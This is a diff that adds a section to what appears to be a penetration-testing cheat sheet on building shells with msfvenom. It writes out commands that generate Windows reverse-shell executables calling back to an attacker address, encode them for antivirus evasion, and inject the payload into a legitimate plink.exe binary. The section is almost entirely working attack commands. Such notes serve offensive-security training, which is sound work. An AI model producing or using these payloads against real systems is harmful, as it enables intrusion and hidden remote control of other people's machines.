@@ -1,3 +1,18 @@
+# Shell creation with msfvenom
+## Windows PE
+```bash
+kali@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.6 LPORT=444 -f exe -o shell_reverse.exe
+```
+- Encoded (**-e** to specify encoder type and **-i** to setup the number of iterations)
+	```bash
+	msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f exe -e x86/shikata_ga_nai -i 9 -o shell_reverse_msf_encoded.exe
+	```
+	- This does not work with modern AVs.
+
+- Inject a payload into an existing PE
+	```bash
+	msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windowsresources/binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe
+	```
 # Shells & Reverse Shells
 
 ## **Shells & Reverse Shells**
